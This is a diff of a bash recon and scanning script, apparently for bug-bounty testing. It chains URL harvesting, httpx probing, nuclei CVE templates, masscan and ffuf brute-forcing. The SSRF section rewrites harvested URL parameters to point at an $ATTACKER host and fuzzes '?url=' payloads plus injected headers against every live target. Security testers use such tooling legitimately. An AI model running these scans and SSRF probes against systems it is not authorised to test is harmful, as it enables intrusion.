@@ -5,6 +5,7 @@
 # Config
 storageDir=$HOME/lazytargets # where all targets
 unwantedpaths='/[.]css$/d;/[.]png$/d;/[.]svg$/d;/[.]jpg$/d;/[.]jpeg$/d;/[.]webp$/d;/[.]gif$/d;/[.]woff$/d'
+unwantedextensions="/swf$/d;/js$/d;/jsx$/d;/php$/d;/asp$/d;/txt$/d;/ini$/d;/log$/d;/pdf$/d;/jpg$/d;/gif$/d;/png$/d"
 
 altdnsWordlist=./lazyWordLists/altdns_wordlist_uniq.txt # used for permutations (--alt option required)
 
@@ -79,12 +80,12 @@ checkwaybackurls(){
   echo "github-endpoints.py..."
   github-endpoints -d $1 > $targetDir/wayback/github-endpoints_out.txt
 
-  # need to get some extras subdomains
   sort -u $targetDir/wayback/gau_output.txt $targetDir/wayback/waybackurls_output.txt $targetDir/wayback/github-endpoints_out.txt -o $targetDir/wayback/wayback_output.txt
-  sed -i '' '/web.archive.org/d' $targetDir/wayback/wayback_output.txt
+
   # remove all out-of-scope lines
   # grep -e "[.]${SCOPE}" -e "//${SCOPE}" $targetDir/wayback/wayback_output.txt | sort -u -o $targetDir/wayback/wayback_output.txt
 
+  # need to get some extras subdomains
   cat $targetDir/wayback/wayback_output.txt | unfurl --unique domains > $targetDir/wayback-subdomains-list.txt
   # sed -i '' '/[.]$/d' $targetDir/wayback-subdomains-list.txt
 
@@ -98,14 +99,15 @@ checkwaybackurls(){
   # cut -f1-2 -d '/' $targetDir/wayback/wayback_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/wayback/wayback_paths.txt
 
   # full paths+queries
-  cat $targetDir/wayback/wayback_output.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/wayback/wayback-paths-list.txt
+  # remove archive and potential emails
+  cat $targetDir/wayback/wayback_output.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d;/web.archive.org/d;/@/d' | sort | uniq > $targetDir/wayback/wayback-paths-list.txt
 
   # sort -u $targetDir/wayback/wayback_paths_out.txt $targetDir/wayback/wayback_paths.txt $targetDir/wayback/wayback_paths_queries.txt -o $targetDir/wayback/wayback-paths-list.txt
   # sed -i '' '/[.]$/d' $targetDir/wayback/wayback-paths-list.txt
-  sort -u $targetDir/wayback/wayback-paths-list.txt -o $targetDir/wayback/wayback-paths-list.txt
-  chown storenth: $targetDir/wayback/wayback-paths-list.txt
   # remove .jpg .jpeg .webp .png .svg .gif, css from paths
   # sed -i '' $unwantedpaths $targetDir/wayback/wayback-paths-list.txt
+  # sort -u $targetDir/wayback/wayback-paths-list.txt -o $targetDir/wayback/wayback-paths-list.txt
+  # chown storenth: $targetDir/wayback/wayback-paths-list.txt
 
   if [ "$alt" = "1" -a "$mad" = "1" ]; then
     # prepare target specific subdomains wordlist to gain more subdomains using --mad mode
@@ -201,9 +203,12 @@ dnsprobing(){
 checkhttprobe(){
   echo
   echo "[httpx] Starting httpx probe testing..."
-  # resolve IP and hosts with http|https for nuclei, gospider and ffuf-bruteforce
-  # httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_ip.txt -follow-host-redirects -threads 500 -o $targetDir/httpx_output_1.txt
-  httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt
+  # resolve IP and hosts with http|https for nuclei, aquatone, gospider, ssrf and ffuf-bruteforce
+  if [[ -n $ip ]]; then
+    httpx -silent -ports 0-200,8000-10000 -l $targetDir/dnsprobe_ip.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt
+  else
+    httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt
+  fi
 
   # sort -u $targetDir/httpx_output_1.txt $targetDir/httpx_output_2.txt -o $targetDir/3-all-subdomain-live-scheme.txt
   cat $targetDir/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $targetDir/3-all-subdomain-live.txt
@@ -224,6 +229,9 @@ nucleitest(){
     sleep 1
     nuclei -silent -stats -l $targetDir/3-all-subdomain-live-scheme.txt \
                     -t ../nuclei-templates/vulnerabilities/ \
+                    -t ../nuclei-templates/cves/2014/ \
+                    -t ../nuclei-templates/cves/2015/ \
+                    -t ../nuclei-templates/cves/2016/ \
                     -t ../nuclei-templates/cves/2017/ \
                     -t ../nuclei-templates/cves/2018/ \
                     -t ../nuclei-templates/cves/2019/ \
@@ -284,7 +292,7 @@ gospidertest(){
     # cut -f1-2 -d '/' $targetDir/gospider/gospider_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/gospider/gospider_paths.txt
 
     # full paths+queries
-    cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/gospider/gospider-paths-list.txt
+    cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d;/web.archive.org/d;/@/d' | sort | uniq > $targetDir/gospider/gospider-paths-list.txt
     # cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/gospider/gospider_paths_queries.txt
 
     # sort -u $targetDir/gospider/gospider_paths_out.txt $targetDir/gospider/gospider_paths.txt $targetDir/gospider/gospider_paths_queries.txt -o $targetDir/gospider/gospider-paths-list.txt
@@ -309,7 +317,7 @@ hakrawlercrawling(){
     # cut -f1-3 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/hakrawler/hakrawler_paths.txt
 
     # full paths+queries
-    cat $targetDir/hakrawler/hakrawler_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler-paths-list.txt
+    cat $targetDir/hakrawler/hakrawler_out.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler-paths-list.txt
 
     # sort -u $targetDir/hakrawler/hakrawler-paths-list.txt -o $targetDir/hakrawler/hakrawler-paths-list.txt
     # chown storenth: $targetDir/hakrawler/hakrawler-paths-list.txt
@@ -327,16 +335,18 @@ custompathlist(){
   if [ "$mad" = "1" ]; then
     echo "Prepare custom wordlist"
     # merge base dirsearchWordlist with target-specific list for deep dive (time sensitive)
-    # sudo sort -u $targetDir/nuclei/nuclei-paths-list.txt $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt $targetDir/hakrawler/hakrawler-paths-list.txt $customFfufBruteWordList -o $customFfufBruteWordList
-    sort -u $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt -o $customFfufBruteWordList
+    # sudo sort -u $targetDir/nuclei/nuclei-paths-list.txt $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt $targetDir/hakrawler/hakrawler-paths-list.txt $customFfufWordList -o $customFfufWordList
+    sort -u $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt -o $customFfufWordList
 
     GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
-    grep -E  "https?://[^\"\\'> ]+|www[.][^\"\\'> ]+|$GREPSCOPE" $customFfufBruteWordList > $customFfufPathWordList
-    gf ssrf $customFfufBruteWordList | uniq > $customFfufSsrfWordList
-    # sed -i '' '/^$/d' $customFfufBruteWordList ?need to check!
-    chown storenth: $customFfufBruteWordList
-    chown storenth: $customFfufPathWordList
+    grep -E  "https?[^\"\\'> ]+|www[.][^\"\\'> ]+|$GREPSCOPE|(([[:alpha:][:digit:]-]+\.)+)?[[:alpha:]-]+\.(com|edu|gov|mil|net|org|biz|be|lu|nl|eu|io|co|bg|ru)" $customFfufWordList | sed "s|%3A|:|gi;s|%2F|\/|gi;s|%253A|:|gi;s|%252F|\/|gi;s|%25253A|:|gi;s|%25252F|\/|gi" | uniq > $customFfufPathWordList
+
     chown storenth: $customFfufSsrfWordList
+    chown storenth: $customFfufWordList
+    chown storenth: $customFfufPathWordList
+
+    # https://github.com/tomnomnom/gf/issues/55
+    sudo -u storenth helpers/gf-filter.sh $customFfufWordList $customFfufSsrfWordList
 
   fi
 }
@@ -346,7 +356,11 @@ custompathlist(){
 ssrftest(){
   if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
     echo
-    echo "[SSRF] Blind probe..."
+    echo "[SSRF-1] Headers..."
+    ssrf-headers-tool $targetDir/3-all-subdomain-live-scheme.txt $ATTACKER
+
+    echo
+    echo "[SSRF-2] Blind probe..."
     # /?url=
     ffuf -s -c -r -u HOST/\?url=$ATTACKERURL/DOMAIN/image.jpg \
         -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
@@ -402,7 +416,7 @@ ssrftest(){
       #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
       #     -w $targetDir/ssrf-list.txt:PATH > /dev/null
 
-      echo "[SSRF-1] prepare ssrf-list: concat path out from gf ssrf..."
+      echo "[SSRF-gf-1] prepare ssrf-list: concat path out from gf ssrf..."
       ITERATOR=0
       while read line; do
         ITERATOR=$((ITERATOR+1))
@@ -425,43 +439,43 @@ ssrftest(){
               -w $targetDir/ssrf-list-1.txt:PATH > /dev/null
       fi
 
-      echo "[SSRF-2] prepare ssrf-list: replacing only interesting urls..."
+      echo "[SSRF-replace-2] prepare ssrf-list: replacing only interesting urls..."
       COUNTER=0
       while read line; do
         COUNTER=$((COUNTER+1))
         echo "processing $COUNTER line"
         echo "[line] $line"
 
-        string_to_replace_1=$(echo $line | grep -oriahE "(https?://[^\"\\'> ]+|www[.][^\"\\'> ]+)" | unfurl domain)
-        echo "string_to_replace_1=$string_to_replace_1"
-        string_to_replace_2=$(echo $line | grep -oriahE "https?%3A%2F%2F[^\"\\'> ]+" | sed "s|%3A|:|gi;s|%2F|\/|gi" | unfurl domain)
-        echo "string_to_replace_2=$string_to_replace_2"
-        string_to_replace_3=$(echo $line | grep -oriahE "https?%253A%252F%252F[^\"\\'> ]+" | sed "s|%253A|:|gi;s|%252F|\/|gi" | unfurl domain) # need to replace also: http%253A%252F%252F
-        echo "string_to_replace_3=$string_to_replace_3"
+        # string_to_replace_1=$(echo $line | grep -oriahE "(https?://[^\"\\'> ]+|www[.][^\"\\'> ]+)" | unfurl domain)
+        # echo "string_to_replace_1=$string_to_replace_1"
+        # string_to_replace_2=$(echo $line | grep -oriahE "https?%3A%2F%2F[^\"\\'> ]+" | sed "s|%3A|:|gi;s|%2F|\/|gi" | unfurl domain)
+        # echo "string_to_replace_2=$string_to_replace_2"
+        # string_to_replace_3=$(echo $line | grep -oriahE "https?%253A%252F%252F[^\"\\'> ]+" | sed "s|%253A|:|gi;s|%252F|\/|gi" | unfurl domain) # need to replace also: http%253A%252F%252F
+        # echo "string_to_replace_3=$string_to_replace_3"
 
-        GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
-        # cases url%3D=mail.web1.a.r3.snapnames.com&servlet
-        string_to_replace_4=$(echo $line | sed "s|%3A|gi:|;s|%2F|\/|gi;s|%253A|:|;s|%252F|\/|gi" | grep -oriahE "(([[:alpha:][:digit:]-]+\.)+)?$GREPSCOPE" | head -n 1)
-        echo "string_to_replace_4=$string_to_replace_4"
+        # GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
+        # # cases url%3D=mail.web1.a.r3.snapnames.com&servlet
+        # string_to_replace_4=$(echo $line | sed "s|%3A|gi:|;s|%2F|\/|gi;s|%253A|:|;s|%252F|\/|gi" | grep -oriahE "(([[:alpha:][:digit:]-]+\.)+)?$GREPSCOPE" | head -n 1)
+        # echo "string_to_replace_4=$string_to_replace_4"
 
         # parse out of scope case &ei=gVJMT_fODcWPiAf5xJVU&usg=AFQjCNFSQ77YM6EKLrOfymj11Dfg2SKk6g&url&2.qwe-4.r.1q.e4.mail-ru.com%&k7iFrf4NoInN9jSQT9WfcQ==
-        string_to_replace_5=$(echo $line | sed "s|%3A|gi:|;s|%2F|\/|gi;s|%253A|:|;s|%252F|\/|gi" | grep -oriahE "(([[:alpha:][:digit:]-]+\.)+)?[[:alpha:]-]+\.([^(php|asp|txt|imp|png|jpg|svg|gif|css|)])?[[:alpha:]]{2,3}" | head -n 1)
+        string_to_replace_5=$(echo $line | grep -oriahE "(([[:alpha:][:digit:]-]+\.)+)?[[:alpha:]-]+\.(com|edu|gov|mil|net|org|biz|be|lu|nl|eu|io|co|bg|ru)" | head -n 1)
         echo "string_to_replace_5=$string_to_replace_5"
 
-        if [[ -n "$string_to_replace_1" ]]; then
-          echo $line | sed "s/$string_to_replace_1/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
-        fi
-        if [[ -n "$string_to_replace_2" ]]; then
-          echo $line | sed "s/$string_to_replace_2/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
-        fi
-        if [[ -n "$string_to_replace_3" ]]; then
-          echo $line | sed "s/$string_to_replace_3/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
-        fi
-        if [[ -n "$string_to_replace_4" ]]; then
-          echo $line | sed "s/$string_to_replace_4/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
-        fi
+        # if [[ -n "$string_to_replace_1" ]]; then
+        #   echo $line | sed "s/$string_to_replace_1/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
+        # fi
+        # if [[ -n "$string_to_replace_2" ]]; then
+        #   echo $line | sed "s/$string_to_replace_2/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
+        # fi
+        # if [[ -n "$string_to_replace_3" ]]; then
+        #   echo $line | sed "s/$string_to_replace_3/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
+        # fi
+        # if [[ -n "$string_to_replace_4" ]]; then
+        #   echo $line | sed "s/$string_to_replace_4/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
+        # fi
         if [[ -n "$string_to_replace_5" ]]; then
-          echo $line | sed "s/$string_to_replace_5/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
+          echo $line | sed "s/$string_to_replace_5/$ATTACKER/gi;s/https/http/gi" >> $targetDir/ssrf-list-2.txt
         fi
       done < $customFfufPathWordList
 
@@ -473,10 +487,10 @@ ssrftest(){
         ENDPOINTCOUNT=$(cat $targetDir/ssrf-list-2.txt | wc -l)
         echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
         echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
-          echo "[SSRF-2] Target url-params probe..."
+          echo "[SSRF-replace-2] Target url-params probe..."
           ffuf -s -r -c -u HOST/PATH \
               -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-              -w $targetDir/ssrf-list-2.txt:PATH > /dev/null
+              -w $targetDir/ssrf-list-2.txt:PATH
       fi
       # echo "[SSRF] prepare ssrflist, path with /wp-admin/users.php to fuzz like wp-admin/users.php?url="
 
@@ -537,8 +551,8 @@ masscantest(){
   echo "[masscan] Looking for open ports..."
   # max-rate for accuracy
   # 25/587-smtp, 110/995-pop3, 143/993-imap, 445-smb, 3306-mysql, 3389-rdp, 5432-postgres, 5900/5901-vnc, 27017-mongodb
-  # masscan -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $targetDir/dnsprobe_ip.txt --rate 1000 --open-only -oG $targetDir/masscan_output.gnmap
-  masscan -p0-65535 -iL $targetDir/dnsprobe_ip.txt --rate 500 -oG $targetDir/masscan_output.gnmap
+  # masscan -p0-65535 | -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $targetDir/dnsprobe_ip.txt --rate 1000 --open-only -oG $targetDir/masscan_output.gnmap
+  masscan -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $targetDir/dnsprobe_ip.txt --rate 500 -oG $targetDir/masscan_output.gnmap
   sleep 1
   sed -i '' '1d;2d;$d' $targetDir/masscan_output.gnmap # remove 1,2 and last lines from masscan out file
   # sort -k 7 -nb $targetDir/masscan_output.gnmap - o $targetDir/masscan_output.gnmap # sort by port number
@@ -600,7 +614,7 @@ ffufbrute(){
     iterator=1
     while read subdomain; do
       # -c stands for colorized, -s for silent mode
-      ffuf -c -s -u ${subdomain}/FUZZ -p 0.1-2.0 -recursion -recursion-depth 2 -mc all -fc 300,301,302,303,304,400,403,404,500,501,502,503 -fs 0 -w $customFfufBruteWordList -t $dirsearchThreads \
+      ffuf -c -s -u ${subdomain}/FUZZ -p 0.1-2.0 -recursion -recursion-depth 2 -mc all -fc 300,301,302,303,304,400,403,404,500,501,502,503 -fs 0 -w $customFfufWordList -t $dirsearchThreads \
           -o $targetDir/ffuf/${iterator}.html  -of html
       iterator=$((iterator+1))
     done < $targetDir/3-all-subdomain-live-scheme.txt
@@ -683,8 +697,8 @@ main(){
   # used for ffuf bruteforce
   if [ "$mad" = "1" -o "$brute" = "1" ]; then
     touch $targetDir/custom_ffuf_wordlist.txt
-    customFfufBruteWordList=$targetDir/custom_ffuf_wordlist.txt
-    # cp $dirsearchWordlist $customFfufBruteWordList
+    customFfufWordList=$targetDir/custom_ffuf_wordlist.txt
+    # cp $dirsearchWordlist $customFfufWordList
 
     # to with gf ssrf output
     touch $targetDir/custom_ffuf_ssrflist.txt
@@ -717,8 +731,8 @@ main(){
     mkdir $targetDir/gospider/
     touch $targetDir/gospider/gospider-paths-list.txt
     # hakrawler output
-    mkdir $targetDir/hakrawler/
-    touch $targetDir/hakrawler/hakrawler-paths-list.txt
+    # mkdir $targetDir/hakrawler/
+    # touch $targetDir/hakrawler/hakrawler-paths-list.txt
     # sqlmap output
     # mkdir $targetDir/sqlmap/
     # gau/waybackurls output
